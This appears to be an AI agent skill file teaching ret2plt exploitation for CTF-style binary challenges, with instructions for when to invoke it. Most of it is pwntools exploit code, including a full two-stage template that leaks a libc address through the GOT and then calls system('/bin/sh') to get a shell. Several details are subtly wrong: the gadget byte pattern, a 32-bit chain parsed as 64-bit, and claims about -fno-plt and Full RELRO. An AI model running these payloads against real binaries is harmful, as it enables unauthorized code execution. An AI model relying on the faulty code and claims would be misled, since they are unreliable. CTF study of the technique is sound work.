---
name: ret2plt-exploit
description: How to perform ret2plt (return-to-PLT) attacks to bypass ASLR by leaking libc addresses. Use this skill whenever the user mentions ASLR bypass, PLT/GOT exploitation, libc leaks, ret2plt, return-to-PLT, or needs to leak function addresses from libc to calculate base addresses. Also use when dealing with binary exploitation challenges involving stack overflows, dynamic binaries, or when the user needs to chain PLT calls to leak GOT entries. Make sure to use this skill for any CTF challenge or binary exploitation task involving ASLR, PIE, or libc address resolution.
---

# Ret2PLT Exploitation Guide

This skill helps you perform **ret2plt (return-to-PLT)** attacks to bypass ASLR by leaking addresses from the Procedure Linkage Table (PLT) and Global Offset Table (GOT).

## What is Ret2PLT?

Ret2plt is a technique to **leak an address from a function in the PLT** to bypass ASLR. When you leak the address of a function like `puts` from libc, you can:

1. **Calculate the base address of libc**
2. **Compute offsets to other functions** like `system`, `exit`, etc.
3. **Build a full exploit** to gain shell access

## When to Use This Technique

- Binary has **ASLR enabled** but **no PIE** (or you've already bypassed PIE)
- You have a **stack overflow** or similar memory corruption vulnerability
- The binary has **dynamic linking** (uses libc functions)
- You need to **leak libc addresses** to calculate offsets

## Core Concept

The key insight: when you call `puts` with the address of `puts` from the GOT, the GOT entry will contain the **exact runtime address** of `puts` in memory. This lets you calculate the libc base.

## Basic Payload Structure

### 32-bit Ret2PLT

```python
from pwn import *

elf = context.binary = ELF('./vuln')
libc = elf.libc

payload = flat(
    b'A' * padding,           # Fill buffer to overflow
    elf.plt['puts'],          # Call puts from PLT
    elf.symbols['main'],      # Return to main (don't exit)
    elf.got['puts']           # Argument: address of puts in GOT
)
```

### 64-bit Ret2PLT

```python
from pwn import *

elf = context.binary = ELF('./vuln')
libc = elf.libc

# Find POP RDI gadget
POP_RDI = next(elf.search(b'\x58\x5f\x89\xf0'))

payload = flat(
    b'A' * padding,           # Fill buffer to overflow
    POP_RDI,                  # Gadget to set RDI
    elf.got['puts'],          # RDI = address of puts in GOT
    elf.plt['puts'],          # Call puts from PLT
    elf.symbols['main']       # Return to main (don't exit)
)
```

## Complete Exploit Template

```python
from pwn import *

# Setup
elf = context.binary = ELF('./vuln')
libc = elf.libc
p = process()

# Phase 1: Leak libc address
p.recvuntil(b'prompt>')  # Adjust to your binary's prompt

payload = flat(
    b'A' * 32,              # Adjust padding to overflow
    elf.plt['puts'],        # Call puts
    elf.symbols['main'],    # Return to main
    elf.got['puts']         # Leak puts address
)

p.sendline(payload)

# Receive leaked address
puts_leak = u64(p.recv(8).ljust(8, b'\x00'))  # Use u32 for 32-bit
p.recvlines(2)  # Consume remaining output

# Calculate libc base
libc.address = puts_leak - libc.sym['puts']
log.success(f'LIBC base: {hex(libc.address)}')

# Phase 2: Get shell
payload = flat(
    b'A' * 32,              # Same padding
    libc.sym['system'],     # Call system
    libc.sym['exit'],       # Return address (cleanup)
    next(libc.search(b'/bin/sh\x00'))  # Argument: /bin/sh
)

p.sendline(payload)
p.interactive()
```

## Modern Considerations

### `-fno-plt` Builds

Modern distributions often compile with `-fno-plt`, which replaces `call foo@plt` with `call [foo@got]`. If there's no PLT stub:

```python
# Still leak with puts, but return directly to GOT entry
payload = flat(
    padding,
    elf.got['foo']  # Jump directly to resolved GOT entry
)
```

### Full RELRO (`-Wl,-z,now`)

With full RELRO, the GOT is read-only, but ret2plt still works for leaks because you only **read** the GOT slot. If the symbol was never called, your first ret2plt will perform lazy binding and then print the resolved slot.

### ASLR + PIE

If PIE is enabled, you must first leak a code pointer to compute the PIE base:

1. Leak a saved return address, function pointer, or `.plt` entry
2. Calculate PIE base
3. Rebase all PLT/GOT addresses
4. Build the ret2plt chain with correct addresses

### AArch64 with BTI/PAC

On ARM64 with Branch Target Identification:
- PLT entries are valid BTI landing pads (`bti c`)
- Prefer jumping into PLT stubs or BTI-annotated gadgets
- Avoid jumping directly to libc gadgets without BTI (causes `BRK`/`PAC` failures)

### Quick Resolution Helper

If the target function is not yet resolved and you need a leak in one shot, chain the PLT call twice:

```python
payload = flat(
    padding,
    elf.plt['foo'],         # First call: resolve the function
    elf.plt['foo'],         # Second call: use it
    elf.got['foo']          # Argument: GOT entry to leak
)
```

## Helper Scripts

### Generate Ret2PLT Payload

Use `scripts/generate_ret2plt_payload.py` to automatically generate payloads:

```bash
python scripts/generate_ret2plt_payload.py \
    --binary ./vuln \
    --padding 32 \
    --arch 64 \
    --output payload.py
```

### Analyze Binary Protections

Use `scripts/analyze_binary_protections.py` to check if ret2plt is viable:

```bash
python scripts/analyze_binary_protections.py ./vuln
```

This checks:
- ASLR status
- PIE status
- RELRO status
- Canary presence
- NX/DEP status

## Common Pitfalls

1. **Wrong padding**: Use `cyclic` or `pattern_create` to find exact offset
2. **Wrong architecture**: Use `u32` for 32-bit, `u64` for 64-bit
3. **Missing recvlines**: Consume all output after leak before sending second payload
4. **PIE not bypassed**: If PIE is enabled, you need to leak PIE base first
5. **Wrong libc**: Make sure you're using the correct libc version

## Debugging Tips

```python
# Use gdb to verify your payload
p = gdb.debug('./vuln', '''
    break *main+100
    continue
''')

# Or use pwntools' gdb context
context.log_level = 'debug'
```

## References

- [MaskRay – All about Procedure Linkage Table](https://maskray.me/blog/2021-09-19-all-about-procedure-linkage-table)
- [ir0nstone – Ret2PLT ASLR Bypass](https://ir0nstone.gitbook.io/notes/types/stack/aslr/plt_and_got)
- [GuyInATuxedo – CSAW Quals 17 SVC](https://guyinatuxedo.github.io/08-bof_dynamic/csawquals17_svc/index.html)
- [GuyInATuxedo – FB19 Overfloat](https://guyinatuxedo.github.io/08-bof_dynamic/fb19_overfloat/index.html)
